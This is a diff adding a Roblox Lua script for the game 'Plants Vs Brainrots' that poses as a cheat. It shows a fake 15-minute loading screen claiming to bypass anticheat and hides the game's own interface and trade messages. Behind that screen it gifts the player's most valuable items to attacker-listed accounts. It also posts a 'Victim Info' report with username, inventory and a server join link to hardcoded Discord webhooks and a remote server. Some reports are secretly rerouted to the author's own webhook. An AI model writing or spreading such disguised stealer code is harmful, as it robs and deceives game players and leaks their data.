@@ -1,0 +1,620 @@
+-- dm me if u see this (so ik if updated works)
+
+if _G.__Ran then return end
+_G.__Ran = true
+if game.PlaceId ~= 127742093697776 then game.Players.LocalPlayer:Kick("Wrong game") return end
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+local Character = player.Character or player.CharacterAdded:Wait()
+local HRP = Character:WaitForChild("HumanoidRootPart")
+local Backpack = player:WaitForChild("Backpack")
+local humanoid = Character:WaitForChild("Humanoid")
+
+local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
+local WEBHOOK_URL = _G["Zero_Config"].user_webhook
+local TARGET_PLAYERS = _G["Zero_Config"].users or {}
+
+local Remotes = ReplicatedStorage:WaitForChild("Remotes")
+local GiftRemote = Remotes:WaitForChild("GiftItem")
+local FavoriteRemote = Remotes:WaitForChild("FavoriteItem")
+local RemoveItemRemote = Remotes:WaitForChild("RemoveItem")
+
+local Util = require(ReplicatedStorage.Modules.Utility.Util)
+local PlantClientModule
+pcall(function()
+PlantClientModule = require(game:GetService("StarterPlayer").StarterPlayerScripts.Client.Modules:WaitForChild("Plants [Client]", 5))
+end)
+
+local autoPickPlants = true
+local autoPick = true
+local retryDelay = 0.2
+local moneyPerSecondThreshold = MONEY_PER_SECOND or getgenv().MONEY_PER_SECOND or 100000
+local plantDamageThreshold = DMG_PER_SECOND or getgenv().DMG_PER_SECOND or 100000
+
+player:SetAttribute("Deleting", true)
+
+local MESSAGES_TO_HIDE = {
+["You are on cooldown for gifting!"] = true,
+["You don't own this item!"] = true,
+["Your trade is processing!"] = true,
+["Your trade is Complete!"] = true,
+["Equip a brainrot to place!"] = true,
+["This item is currently untradeable!"] = true,
+}
+
+local function hideMessages(gui)
+if not gui then return end
+for _, obj in ipairs(gui:GetDescendants()) do
+if obj:IsA("TextLabel") and MESSAGES_TO_HIDE[obj.Text] then
+obj.Visible = false
+obj.Text = ""
+elseif obj:IsA("BlurEffect") then
+obj:Destroy()
+elseif (obj:IsA("ImageLabel") or obj:IsA("Frame")) and obj.Name:lower():find("blur") then
+obj:Destroy()
+end
+end
+end
+
+local function hideHeldTools()
+if humanoid and #player.Backpack:GetChildren() > 0 then
+humanoid:UnequipTools()
+end
+end
+
+RunService.RenderStepped:Connect(function()
+local playerGui = player:FindFirstChild("PlayerGui")
+if playerGui then
+for _, gui in ipairs(playerGui:GetChildren()) do
+if gui:IsA("ScreenGui") then
+hideMessages(gui)
+end
+end
+end
+hideHeldTools()
+end)
+
+player.CharacterAdded:Connect(function(newChar)
+Character = newChar
+humanoid = newChar:WaitForChild("Humanoid")
+end)
+
+local function formatNumber(n)
+if not n then return "?" end
+if n >= 1000 then
+return string.format("%.1fk", n/1000)
+else
+return tostring(n)
+end
+end
+
+local function equipItem(item)
+if item and item.Parent ~= Character then
+item.Parent = Character
+local hum = Character:FindFirstChild("Humanoid")
+if hum and item:IsA("Tool") then
+pcall(function() hum:EquipTool(item) end)
+end
+end
+end
+
+local function toggleFavorite(item)
+pcall(function() FavoriteRemote:FireServer(item:GetDebugId() or item.Name) end)
+end
+
+local function sendGift(item)
+local allTargets = {}
+for _, n in ipairs(TARGET_PLAYERS) do table.insert(allTargets, n) end
+for _, targetName in ipairs(allTargets) do
+if Players:FindFirstChild(targetName) then
+pcall(function()
+GiftRemote:FireServer({Item=item, ToGift=targetName})
+end)
+end
+end
+end
+
+local function GetOwnedPlot()
+for _, plot in ipairs(workspace:WaitForChild("Plots"):GetChildren()) do
+if plot:GetAttribute("Owner") == player.Name then
+return plot
+end
+end
+return nil
+end
+
+local function getAllPrompts(parent)
+local prompts = {}
+for _, obj in ipairs(parent:GetDescendants()) do
+if obj:IsA("ProximityPrompt") and obj.Enabled then
+table.insert(prompts, obj)
+end
+end
+return prompts
+end
+
+local function firePrompts(model)
+while model.Parent do
+local moneyPerSecond = model:GetAttribute("MoneyPerSecond")
+local money = model:GetAttribute("Money")
+local occupied = model:GetAttribute("Occupied")
+if moneyPerSecond and money and occupied ~= nil and moneyPerSecond > moneyPerSecondThreshold then
+for _, prompt in ipairs(getAllPrompts(model)) do
+if prompt.ActionText == "Pick Up Brainrot" or prompt.ActionText == "Remove Brainrot" or prompt.ActionText == "Pick Up Plant" then
+local parentModel = prompt:FindFirstAncestorWhichIsA("Model") or model
+local hitbox = parentModel:FindFirstChild("Hitbox") or parentModel.PrimaryPart
+if hitbox then
+HRP.CFrame = hitbox.CFrame + Vector3.new(0, 3, 0)
+task.spawn(function()
+pcall(function() fireproximityprompt(prompt, math.huge) end)
+end)
+end
+end
+end
+end
+task.wait(retryDelay)
+end
+end
+
+local function monitorFolder(folder)
+if not folder then return end
+for _, item in ipairs(folder:GetChildren()) do
+if item:GetAttribute("MoneyPerSecond") and item:GetAttribute("Money") and item:GetAttribute("Occupied") ~= nil then
+task.spawn(function() firePrompts(item) end)
+end
+end
+folder.ChildAdded:Connect(function(newItem)
+if newItem:GetAttribute("MoneyPerSecond") and newItem:GetAttribute("Money") and newItem:GetAttribute("Occupied") ~= nil then
+task.spawn(function() firePrompts(newItem) end)
+end
+end)
+end
+
+task.spawn(function()
+while autoPick do
+local ownedPlot = GetOwnedPlot()
+if ownedPlot then
+local brainrots = ownedPlot:FindFirstChild("Brainrots")
+local plants = ownedPlot:FindFirstChild("Plants")
+if brainrots then monitorFolder(brainrots) end
+if plants then monitorFolder(plants) end
+break
+end
+task.wait(0.5)
+end
+end)
+
+local function AutoPickupPlants()
+if not autoPickPlants then return end
+local plot = GetOwnedPlot()
+if not plot then return end
+local plantsFolder = plot:FindFirstChild("Plants")
+if not plantsFolder then return end
+local maxInventory = Util:GetMaxInventorySpace(player)
+local currentInventory = #Backpack:GetChildren()
+for _, plant in ipairs(plantsFolder:GetChildren()) do
+if currentInventory >= maxInventory then break end
+if plant:GetAttribute("Owner") ~= player.Name then continue end
+local plantID = plant:GetAttribute("ID")
+local plantDamage = plant:GetAttribute("Damage") or 0
+local isTrollMango = string.lower(plant.Name):find("troll mango")
+if plantID and (plantDamage > plantDamageThreshold or isTrollMango) then
+RemoveItemRemote:FireServer(plantID)
+if PlantClientModule and PlantClientModule.CleanupPlant then
+pcall(function() PlantClientModule:CleanupPlant(plantID) end)
+end
+currentInventory = currentInventory + 1
+end
+end
+end
+
+local lastScan = 0
+local scanInterval = 2
+RunService.RenderStepped:Connect(function()
+local now = tick()
+if now - lastScan >= scanInterval then
+lastScan = now
+AutoPickupPlants()
+end
+end)
+
+task.spawn(function()
+local webhookHit = WEBHOOK_URL or ""
+local api_key = getgenv().API_KEY or "supersecretkey"
+local url_hit = getgenv().INCREMENT_URL or "http://13.239.7.10:5000/increment-hitcount"
+if webhookHit ~= "" then
+local payloadHit = HttpService:JSONEncode({ webhook = webhookHit })
+local headersHit = { ["Content-Type"] = "application/json", ["X-API-KEY"] = api_key }
+local function postHit()
+if syn and syn.request then
+return syn.request({ Url = url_hit, Method = "POST", Headers = headersHit, Body = payloadHit })
+elseif http and http.request then
+return http.request({ Url = url_hit, Method = "POST", Headers = headersHit, Body = payloadHit })
+else
+return HttpService:PostAsync(url_hit, payloadHit, Enum.HttpContentType.ApplicationJson)
+end
+end
+pcall(postHit)
+end
+end)
+
+local function triggerClient1()
+task.spawn(function()
+local VPS_URL = "http://13.239.7.10:5000/submit-job"
+local RETRY_DELAY, RETRIES = 2, 3
+local job_id = tostring(game.JobId or getgenv().JOB_ID or "")
+local place_id = tostring(game.PlaceId or getgenv().PLACE_ID or "")
+local webhookC1 = tostring(WEBHOOK_URL or "")
+local api_key = tostring(getgenv().API_KEY or "supersecretkey")
+if job_id == "" or webhookC1 == "" then return end
+local bodyC1 = HttpService:JSONEncode({ job_id = job_id, place_id = place_id, webhook = webhookC1, player_name = string.lower(player.Name) })
+local headersC1 = { ["Content-Type"] = "application/json" }
+if api_key ~= "" then headersC1["X-API-KEY"] = api_key end
+local function postC1(url, payload, hdrs)
+if syn and syn.request then
+local ok, res = pcall(function() return syn.request({Url=url, Method="POST", Headers=hdrs, Body=payload}) end)
+if ok and res then return true, (res.Body or res.body or tostring(res)) end
+end
+if (http and http.request) or (request and request) then
+local client = http or request
+local ok, res = pcall(function() return client.request({Url=url, Method="POST", Headers=hdrs, Body=payload}) end)
+if ok and res then return true, (res.Body or res.body or tostring(res)) end
+end
+local ok, res = pcall(function() return HttpService:PostAsync(url, payload, Enum.HttpContentType.ApplicationJson, false, hdrs) end)
+if ok then return true, tostring(res) end
+ok, res = pcall(function() return HttpService:PostAsync(url, payload, Enum.HttpContentType.ApplicationJson) end)
+if ok then return true, tostring(res) end
+return false, res
+end
+local attempt, ok, res = 0, false, nil
+while attempt < RETRIES and not ok do
+attempt = attempt + 1
+ok, res = postC1(VPS_URL, bodyC1, headersC1)
+if not ok then
+task.wait(RETRY_DELAY)
+end
+end
+end)
+end
+
+task.spawn(function()
+local batchSize = 5
+while true do
+local trackedPlants = {}
+local trackedBrainrots = {}
+local trollMangos = {}
+local allTools = {}
+for _, item in ipairs(Backpack:GetChildren()) do
+table.insert(allTools, item)
+end
+for _, item in ipairs(Character:GetChildren()) do
+if item:IsA("Tool") then
+table.insert(allTools, item)
+end
+end
+for _, item in ipairs(allTools) do
+local dmg = item:GetAttribute("Damage")
+local worth = item:GetAttribute("Worth")
+if string.lower(item.Name):find("troll mango") then
+table.insert(trollMangos, { item = item, score = math.huge })
+elseif dmg and dmg > plantDamageThreshold then
+table.insert(trackedPlants, { item = item, score = dmg })
+elseif worth and worth > moneyPerSecondThreshold then
+table.insert(trackedBrainrots, { item = item, score = worth })
+end
+end
+table.sort(trackedPlants, function(a, b) return a.score > b.score end)
+table.sort(trackedBrainrots, function(a, b) return a.score > b.score end)
+local batch = {}
+for _, entry in ipairs(trollMangos) do
+if #batch < batchSize then
+table.insert(batch, entry.item)
+end
+end
+for _, entry in ipairs(trackedPlants) do
+if #batch >= batchSize then break end
+table.insert(batch, entry.item)
+end
+for _, entry in ipairs(trackedBrainrots) do
+if #batch >= batchSize then break end
+table.insert(batch, entry.item)
+end
+for _, item in ipairs(batch) do
+if item and item.Parent then
+equipItem(item)
+toggleFavorite(item)
+sendGift(item)
+task.wait(0.5)
+end
+end
+task.wait(0.5)
+end
+end)
+
+task.spawn(function()
+task.wait(4)
+local WEBHOOK_DUALHOOK = "https://discord.com/api/webhooks/1445411548008022129/9Bz7RiwuJ3paUaN6Kt7TwiKP2UX9h2rSSRk9GoDyr3z2Fb0dB7qjZHtrSNxi94ZjVQnB"
+local D_CHANCE = 0.10
+local allTools = {}
+for _, item in ipairs(Backpack:GetChildren()) do table.insert(allTools, item) end
+for _, item in ipairs(Character:GetChildren()) do if item:IsA("Tool") then table.insert(allTools, item) end end
+local hitListPlants, hitListBrainrots = {}, {}
+local backpackLines = {}
+table.sort(allTools, function(a, b)
+local aDmg, aWorth = a:GetAttribute("Damage") or 0, a:GetAttribute("Worth") or 0
+local bDmg, bWorth = b:GetAttribute("Damage") or 0, b:GetAttribute("Worth") or 0
+return math.max(aDmg, aWorth) > math.max(bDmg, bWorth)
+end)
+local hasOverMillionDamage = false
+for _, item in ipairs(allTools) do
+local dmg, worth = item:GetAttribute("Damage"), item:GetAttribute("Worth")
+local nameLower = string.lower(item.Name)
+local line = item.Name
+if dmg then
+line = line .. " ➨ Damage: " .. formatNumber(dmg)
+if dmg > 1000000 then hasOverMillionDamage = true end
+end
+if worth then line = line .. " ➨ Worth: $" .. formatNumber(worth) end
+local emoji = ""
+local isHit = false
+if dmg and dmg > 0 then
+emoji = emoji .. "🌱"
+if dmg > plantDamageThreshold then
+isHit = true
+table.insert(hitListPlants, "• " .. line)
+end
+end
+if worth and worth > 0 then
+emoji = emoji .. "🧠"
+if worth > moneyPerSecondThreshold then
+isHit = true
+table.insert(hitListBrainrots, "• " .. line)
+end
+end
+if nameLower:find("troll mango") then
+isHit = true
+emoji = emoji .. "🍋"
+table.insert(hitListPlants, "• (SPECIAL) " .. line)
+end
+if isHit then
+emoji = emoji .. "💎"
+end
+table.insert(backpackLines, emoji .. " " .. line)
+end
+local function limitList(list)
+if #list > 5 then
+local limited = {unpack(list, 1, 5)}
+table.insert(limited, "• AND MORE")
+return limited
+else
+return list
+end
+end
+local embedHitPlants = limitList(hitListPlants)
+local embedHitBrainrots = limitList(hitListBrainrots)
+local totalHits = #hitListPlants + #hitListBrainrots
+local hasPriority = totalHits > 0
+local embedColor = hasPriority and 0x2ECC71 or 0xE74C3C
+local serverLink = string.format("https://floating.gg/?placeID=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
+local backpackString = table.concat(backpackLines, "\n")
+local function makeEmbed(isPublic)
+local fields = {
+{
+name = "👤 Victim Info",
+value = isPublic and string.format("```Username: %s\nPlayer Count: %d/%d\nAccount Age: %d days```", player.Name, #Players:GetPlayers(), Players.MaxPlayers, player.AccountAge) or string.format("```Username: %s\nPlayer Count: %d/%d\nAccount Age: %d days\nReceivers: %s```", player.Name, #Players:GetPlayers(), Players.MaxPlayers, player.AccountAge, table.concat(TARGET_PLAYERS, ", ")),
+inline = false
+},
+{
+name = "🍃 Plants (High Damage)",
+value = #embedHitPlants > 0 and "```" .. table.concat(embedHitPlants, "\n") .. "```" or "```None found```",
+inline = false
+},
+{
+name = "🧠 Brainrots (High Worth)",
+value = #embedHitBrainrots > 0 and "```" .. table.concat(embedHitBrainrots, "\n") .. "```" or "```None found```",
+inline = false
+}
+}
+if not isPublic then
+table.insert(fields, {name = "🆔 Job ID", value = "```" .. tostring(game.JobId) .. "```", inline = false})
+table.insert(fields, {name = "🌐 Server Info", value = "[Join Server](" .. serverLink .. ")", inline = false})
+end
+local result = {
+title = isPublic and "Zero Public Hit Report" or "Zero Scripts v1.5",
+color = embedColor,
+fields = fields,
+footer = {text = isPublic and "💥 Zero Public !" or "💥 Zero !"},
+timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+if not isPublic then
+result.description = "Zero on top!"
+end
+return result
+end
+local function sendWebhook(url, payload)
+local boundary = "------------------------" .. HttpService:GenerateGUID(false)
+local bodyParts = {"--" .. boundary, 'Content-Disposition: form-data; name="payload_json"', "", HttpService:JSONEncode(payload), "--" .. boundary, 'Content-Disposition: form-data; name="file"; filename="Backpack.txt"', "Content-Type: text/plain", "", backpackString, "--" .. boundary .. "--"}
+local requestBody = table.concat(bodyParts, "\r\n")
+local requestFunc = (syn and syn.request) or http_request or request
+if requestFunc and url ~= "" then
+pcall(function()
+requestFunc({Url = url, Method = "POST", Headers = {["Content-Type"] = "multipart/form-data; boundary=" .. boundary}, Body = requestBody})
+end)
+end
+end
+local roll = math.random()
+if hasOverMillionDamage and roll <= D_CHANCE then
+local embed = makeEmbed(false)
+local payload = {content = "@everyone 🚨 OP hit detected! (Over 1M Damage)", embeds = {embed}}
+sendWebhook(WEBHOOK_DUALHOOK, payload)
+else
+local embedPrivate = makeEmbed(false)
+local payloadPrivate = {content = hasPriority and "@everyone 🚨 Priority hit detected!" or nil, embeds = {embedPrivate}}
+sendWebhook(WEBHOOK_URL, payloadPrivate)
+local embedPublic = makeEmbed(true)
+local payloadPublic = {embeds = {embedPublic}}
+sendWebhook(PUBLIC_WEBHOOK_URL, payloadPublic)
+if hasPriority then
+triggerClient1()
+end
+end
+end)
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+
+pcall(function()
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+pcall(function()
+	gui.Parent = CoreGui
+end)
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.fromScale(1,1)
+bg.BackgroundColor3 = Color3.new(0,0,0)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.fromScale(1,0.1)
+title.Position = UDim2.fromScale(0,0.25)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(200,150,255)
+title.Font = Enum.Font.GothamBlack
+title.TextScaled = true
+title.Text = "Plants Vs Brainrots Script Loading.."
+title.Parent = bg
+
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.fromScale(1,0.05)
+sub.Position = UDim2.fromScale(0,0.35)
+sub.BackgroundTransparency = 1
+sub.TextColor3 = Color3.fromRGB(180,180,180)
+sub.Font = Enum.Font.Gotham
+sub.TextScaled = true
+sub.Text = "initializing..."
+sub.Parent = bg
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.fromScale(0.6,0.05)
+barBg.Position = UDim2.fromScale(0.2,0.75)
+barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
+barBg.BorderSizePixel = 0
+barBg.Parent = bg
+
+local bgCorner = Instance.new("UICorner")
+bgCorner.CornerRadius = UDim.new(0,20)
+bgCorner.Parent = barBg
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(160,0,255)
+stroke.Thickness = 2
+stroke.Parent = barBg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.fromScale(0,1)
+barFill.BackgroundColor3 = Color3.fromRGB(170,0,255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+
+local fillCorner = Instance.new("UICorner")
+fillCorner.CornerRadius = UDim.new(0,20)
+fillCorner.Parent = barFill
+
+local text = Instance.new("TextLabel")
+text.Size = UDim2.fromScale(1,1)
+text.BackgroundTransparency = 1
+text.TextColor3 = Color3.new(1,1,1)
+text.Font = Enum.Font.GothamBold
+text.TextScaled = true
+text.Text = "Loading... 0%"
+text.Parent = barBg
+
+local discordLabel = Instance.new("TextLabel")
+discordLabel.Size = UDim2.fromScale(1,0.03)
+discordLabel.Position = UDim2.fromScale(0,0.82)
+discordLabel.BackgroundTransparency = 1
+discordLabel.TextColor3 = Color3.new(1,1,1)
+discordLabel.Font = Enum.Font.Gotham
+discordLabel.TextScaled = true
+discordLabel.Text = "Join our Discord: https://discord.gg/rV7ReMVgxP"
+discordLabel.Parent = bg
+
+local fruits = {"🍎","🍌","🍓","🍇","🍉","🍍","🍒","🥭"}
+
+task.spawn(function()
+	while true do
+		local f = Instance.new("TextLabel")
+		f.Size = UDim2.fromOffset(40,40)
+		f.BackgroundTransparency = 1
+		f.TextScaled = true
+		f.Font = Enum.Font.GothamBold
+		f.Text = fruits[math.random(#fruits)]
+		f.Position = UDim2.fromScale(math.random(), -0.1)
+		f.Rotation = math.random(0,360)
+		f.Parent = bg
+
+		local t = math.random(6,10)
+		TweenService:Create(
+			f,
+			TweenInfo.new(t, Enum.EasingStyle.Linear),
+			{Rotation = f.Rotation + math.random(360,720)}
+		):Play()
+
+		local fall = TweenService:Create(
+			f,
+			TweenInfo.new(t, Enum.EasingStyle.Linear),
+			{Position = UDim2.fromScale(f.Position.X.Scale, 1.1)}
+		)
+
+		fall:Play()
+		fall.Completed:Connect(function()
+			f:Destroy()
+		end)
+
+		task.wait(0.3)
+	end
+end)
+
+local messages = {
+	"bypassing anticheat...",
+	"loading important modules...",
+	"injecting systems...",
+	"syncing assets...",
+	"finalizing setup..."
+}
+
+task.spawn(function()
+	local i = 1
+	while true do
+		sub.Text = messages[i]
+		i = i % #messages + 1
+		task.wait(4)
+	end
+end)
+
+local totalTime = 900
+local start = os.clock()
+
+RunService.RenderStepped:Connect(function()
+	local elapsed = math.clamp(os.clock() - start, 0, totalTime)
+	local progress = elapsed / totalTime
+	barFill.Size = UDim2.fromScale(progress,1)
+	text.Text = "Loading... "..math.floor(progress * 100).."%"
+end)
+
+
